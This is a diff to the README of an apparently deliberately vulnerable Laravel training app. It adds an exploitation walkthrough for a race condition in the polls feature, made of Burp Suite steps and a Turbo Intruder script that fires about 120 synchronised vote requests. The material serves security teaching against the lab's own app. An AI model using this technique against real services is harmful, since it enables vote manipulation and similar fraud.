@@ -16,7 +16,7 @@ In each part sleep is used to allow for easier exploit of race condition.
 3. Replace `.env` with `.env.example`
 4. Create and connect to database
 5. Run `php artisan migrate --seed` with default seeder
-6. Run `php artisan serve` to start application
+6. Run `php artisan serve` to start application. For testing race conditions local webserver should be used.
 7. Log@in as `admin@admin.sk` and `adminadmin`
 
 ## Polls
@@ -28,6 +28,38 @@ First part is a simple polls app represented by Polls tab. In each poll user can
 `/polls/revoke` allows for revoking all votes for currently logged in user
 
 `/answers/` shows answer numbers for each poll
+
+### Exploitation
+
+1. Open up burp suite or similiar tool
+2. Open inbuilt browser, login and navigate to polls
+3. Start intercept mode and submit a vote
+4. Copy request contents over to repeater
+5. Boot up turbo intruder
+6. Following script is used, where inside post the request to be repeated should be placed. Do not forget to put `\r\n\r\n` at the end of request (otherwise malformed HTTP request exception is raised)
+```python
+   def queueRequests(target, wordlists):
+        engine = RequestEngine(endpoint=target.endpoint,
+                               concurrentConnections=120,
+                               requestsPerConnection=120,
+                               pipeline=False)
+        post = '''
+            \r\n\r\n
+            '''
+
+
+        for i in range(1, 120):
+            engine.queue(post, gate='race')
+
+        engine.openGate('race');
+        engine.complete(timeout=15)
+
+
+        def handleResponse(req, interesting):
+            if interesting:
+                table.add(req)
+```
+7. Start attack and observe results. In case only one vote is added, make sure laravel is not run with `php artisan serve` but use local webserver like apache
 
 ## Coupons
 
